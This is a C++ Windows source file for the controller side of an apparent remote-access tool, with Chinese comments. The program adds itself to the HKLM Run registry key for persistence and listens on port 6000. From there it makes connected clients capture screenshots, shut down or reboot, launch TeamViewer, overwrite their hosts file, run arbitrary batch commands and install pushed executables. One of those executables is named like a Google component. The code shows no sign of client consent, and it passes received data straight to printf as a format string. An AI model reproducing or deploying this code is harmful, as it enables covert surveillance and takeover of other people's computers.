#include <stdio.h>
#include <WinSock2.h>
#include <fstream>
#include <string>
#include <iostream>
using namespace std;
#pragma comment(lib, "ws2_32.lib")

LONG addreg(char *p){
	HKEY hkey;
	LONG ReturnNum;
	DWORD dwType = REG_SZ;
	DWORD dwSize;
	dwSize=strlen(p);
	char name[12] = "IPServer";//存放路径。
	//添加开机启动项到注册表。
	ReturnNum=RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,KEY_ALL_ACCESS|KEY_WOW64_32KEY,&hkey);

	if(ReturnNum!=0)
		return -1;
	LONG lResult = RegSetValueExA(hkey, name,(DWORD)0,dwType, (BYTE*)p,dwSize);

	RegCloseKey(hkey);
	return lResult;
}

int main()
{
	char ExePlace[1024];/*保存地址的数组*/
	char ExeDir[1024] = {0};
	GetModuleFileNameA(0,ExePlace,1024);/*获取当前运行全路径*/
	puts(ExePlace);/*输出获取到的路径*/
	addreg(ExePlace);

	HWND hWnd = FindWindowA("ConsoleWindowClass",ExePlace);
	char *p = strrchr(ExePlace, '\\');
	memcpy(ExeDir, ExePlace, strlen(ExePlace)-strlen(p));

	//加载套接字库
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(1,1);

	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0)
	{
		return -1;
	}

	if(LOBYTE(wsaData.wVersion) != 1
		|| HIBYTE(wsaData.wVersion) != 1){
			WSACleanup();

			return -1;
	}

	//创建用于监听的套接字
	SOCKET sockSrv = socket(AF_INET, SOCK_STREAM, 0);

	int port = 6000;
	SOCKADDR_IN addrSrv;
	addrSrv.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(port);

	printf("Start Service port:%d\n", port);
	//绑定套接字
	bind(sockSrv, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
	//将套接字设为监听模式，准备接受客户请求
	listen(sockSrv, 5);

	SOCKADDR_IN addrClient;
	int len = sizeof(SOCKADDR);
	
	while(1){
		//等待客户请求到来
		SOCKET sockConn = accept(sockSrv, (SOCKADDR*)&addrClient, &len);

		char sendBuf[100];
		int nLen = 0;
		char recvbuf[100];
// 		sprintf_s(sendBuf, "Welcome %s to visit my computer!",
// 			inet_ntoa(addrClient.sin_addr));
// 		//发送数据
// 		int nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
		
		//接收数据
// 		memset(recvbuf, 0, 100);
// 		nLen = recv(sockConn, recvbuf, 100, 0);
// 		//打印数据
// 		if (nLen > 1)
// 			printf("client: %s. (%d r)\n", recvbuf, nLen);

		char c = getchar();
		switch(c)
		{
		case 'h':
			{
printf("=====================================\n\
h:获取帮助\n\
i:获取客户端IP\n\
u:更新客户端ipclient软件\n\
p:获取客户端截图\n\
s:关闭客户端电脑\n\
r:重启客户端电脑\n\
c:开启客户端电脑的teamviewer\n\
o:更新客户端host文件\n\
m:更新客户端monitor软件\n\
b:远程执行bat命令\n\
t:远程传输文件到客户端\n\
 =========================================\n");
			}
			break;
		case 'i'://需要获取IP信息
			{
				//发送数据
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","i");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(200);

				//接收数据
				memset(recvbuf, 0, 100);
				nLen = recv(sockConn, recvbuf, 100, 0);
				//打印数据
				printf("client: %s. (%d r)\n", recvbuf, nLen);
				printf("service: Client Ip is %s.\n", inet_ntoa(addrClient.sin_addr));

			}
			break;
		case 'p'://需要获取截图
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","p");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				//Sleep(200);

				//接收数据
				memset(recvbuf, 0, 100);
				nLen = recv(sockConn, recvbuf, 100, 0);
				if (strcmp(recvbuf, "SendImage") == 0)
				{
					Sleep(100);
					int nImageSize = 0;
					memset(recvbuf, 0, 100);
					nLen = recv(sockConn, recvbuf, 100, 0);
					if (nLen > 0)
					{
						nImageSize = atoi(recvbuf);
					}
					BYTE* imageData = new BYTE[nImageSize];
					if (!imageData)
					{
						break;
					}
					nLen = recv(sockConn, (char*)imageData, nImageSize, 0);

					FILE *fp = fopen(".\\abc.bmp", "w+b"); 
					if (!fp)
					{
						break;
					}
					fwrite(imageData, 1, nImageSize, fp);
					fclose(fp);

					if (imageData)
					{
						delete[] imageData;
						imageData = NULL;
					}

					//自动打开当前的图片
  					char cCMD[400] = {0};
					ofstream outCmd = ofstream(".\\killRundll32.bat");
					sprintf_s(cCMD, 
						"%s\\abc.bmp\n\
						ping -n 6 127.0.0.1>nul\n\
						taskkill /im rundll32.exe\n", ExeDir);
					outCmd.write(cCMD, strlen(cCMD));
					outCmd.close();

					memset(cCMD, 0 ,400);
					sprintf_s(cCMD, "/C %s\\killRundll32.bat", ExeDir);
					HINSTANCE iErr = ShellExecuteA(hWnd, "open", "cmd.exe", 
						cCMD, NULL, SW_HIDE);
					memset(cCMD, 0 ,400);
					sprintf_s(cCMD, "error = %d\n", (int)iErr);
					printf(cCMD);
				}
			}
			break;
		case 's'://关闭电脑
			{
				//发送数据
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","s");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(200);
			}
			break;
		case 'r'://重启电脑
			{
				//发送数据
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","r");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(200);
			}
			break;
		case 'u'://更新软件
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","u");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(100);
				//发送数据
				char* byFileData = NULL;
				ifstream in = ifstream(".\\IPClient.exe", ios_base::binary);
				if (!in)
				{
					break;
				}
				in.seekg(0, ios_base::end);//把文件指针直接移动到最后一位
				int size = in.tellg();
				if (size == -1)
				{
					break;
				}

				char cDataSize[40] = {0};
				sprintf_s(cDataSize, "%d", size);
				nLen = send(sockConn, cDataSize, strlen(cDataSize), 0);
				Sleep(2000);
				byFileData = new char[size];
				if(!byFileData)
					break;
				in.seekg(0, ios_base::beg);//移动文件头来读取数据
				in.read(byFileData, size);
				in.close();
				nLen = send(sockConn, byFileData, size, 0);
				Sleep(1);
				if (byFileData)
				{
					delete byFileData;
					byFileData = NULL;
				}

				memset(cDataSize, 0, 40);
				nLen = recv(sockConn, cDataSize, 40, 0);
				if (nLen > 0)
				{
					printf(cDataSize);
				}
				Sleep(100);
			}
			break;
		case 'c'://打开teamview控制软件
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","c");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(100);

				char cDataSize[40] = {0};
				memset(cDataSize, 0, 40);
				nLen = recv(sockConn, cDataSize, 40, 0);
				if (nLen > 0)
				{
					printf(cDataSize);
				}
			}
			break;
		case 'o'://更新host的文件h
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","h");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(100);
			}
			break;
		case 'm'://更新软件
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","m");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(10);
				//发送数据
				char* byFileData = NULL;
				ifstream in = ifstream(".\\iGoogleM.exe", ios_base::binary);
				if (!in)
				{
					break;
				}
				in.seekg(0, ios_base::end);//把文件指针直接移动到最后一位
				int size = in.tellg();
				if (size == -1)
				{
					break;
				}

				char cDataSize[40] = {0};
				sprintf_s(cDataSize, "%d", size);
				nLen = send(sockConn, cDataSize, strlen(cDataSize), 0);
				Sleep(2000);
				byFileData = new char[size];
				if(!byFileData)
					break;
				in.seekg(0, ios_base::beg);//移动文件头来读取数据
				in.read(byFileData, size);
				in.close();
				nLen = send(sockConn, byFileData, size, 0);
				Sleep(1);
				if (byFileData)
				{
					delete byFileData;
					byFileData = NULL;
				}

				memset(cDataSize, 0, 40);
				nLen = recv(sockConn, cDataSize, 40, 0);
				if (nLen > 0)
				{
					printf(cDataSize);
				}
				Sleep(100);
			}
			break;
		case 'b'://更新host的文件h
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","b");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(100);

				printf("CMD>");
				while(TRUE)
				{
					char pCmd[200] = {0};
					string strCin;
					getline(cin, strCin);
					memcpy(pCmd, strCin.data(), strCin.size());
					if (strCin.size() <= 0)
					{
						continue;
					}
					nLen = send(sockConn, pCmd, strlen(pCmd)+1, 0);
					Sleep(100);
					
					if (strcmp(pCmd, "q") == 0)
					{
						break;
					}

					char* pRecvCmd = NULL;
					char nSize[100] = {0};
					recv(sockConn, nSize, 100, 0);

					if (pRecvCmd == NULL)
					{
						pRecvCmd = new char[atoi(nSize)+1];
						memset(pRecvCmd, 0, atoi(nSize)+1);
					}
					Sleep(100);

					recv(sockConn, pRecvCmd, atoi(nSize)+1, 0);
					printf(pRecvCmd);

					if (pRecvCmd)
					{
						delete pRecvCmd;
						pRecvCmd = NULL;
					}

					printf("CMD>");
					Sleep(10);
				}
				printf("\n");
			}
			break;
		case 't':
			{
				memset(sendBuf, 0, 100);
				sprintf_s(sendBuf, "%s","t");
				nLen = send(sockConn, sendBuf, strlen(sendBuf)+1, 0);
				Sleep(10);

				char pFileName[200] = {0};
				string strCin = "";
				while(strCin.size() <= 0)
				{
					getline(cin, strCin);
					if (strCin.size() <= 0)
					{
						continue;
					}
				}
				memcpy(pFileName, strCin.data(), strCin.size());
				nLen = send(sockConn, pFileName, strlen(pFileName), 0);
				if(nLen <= 0)
					break;

				char pFileNamePath[200] = {0};
				sprintf_s(pFileNamePath, "%s\\%s", ExeDir, pFileName);
				Sleep(1000);
				//发送数据
				char* byFileData = NULL;
				ifstream in = ifstream(pFileName, ios_base::binary);
				if (!in)
				{
					break;
				}
				in.seekg(0, ios_base::end);//把文件指针直接移动到最后一位
				int size = in.tellg();
				if (size == -1)
				{
					break;
				}

				char cDataSize[40] = {0};
				sprintf_s(cDataSize, "%d", size);
				nLen = send(sockConn, cDataSize, strlen(cDataSize), 0);
				Sleep(2000);
				byFileData = new char[size];
				if(!byFileData)
					break;
				in.seekg(0, ios_base::beg);//移动文件头来读取数据
				in.read(byFileData, size);
				in.close();
				nLen = send(sockConn, byFileData, size, 0);
				Sleep(1);
				if (byFileData)
				{
					delete byFileData;
					byFileData = NULL;
				}

				memset(cDataSize, 0, 40);
				nLen = recv(sockConn, cDataSize, 40, 0);
				if (nLen > 0)
				{
					printf(cDataSize);
				}
				Sleep(100);
			}
			break;
		default:
			break;
		}
		
		//关闭套接字
		closesocket(sockConn);
	}
	closesocket(sockSrv);
	WSACleanup();
	return 0;
}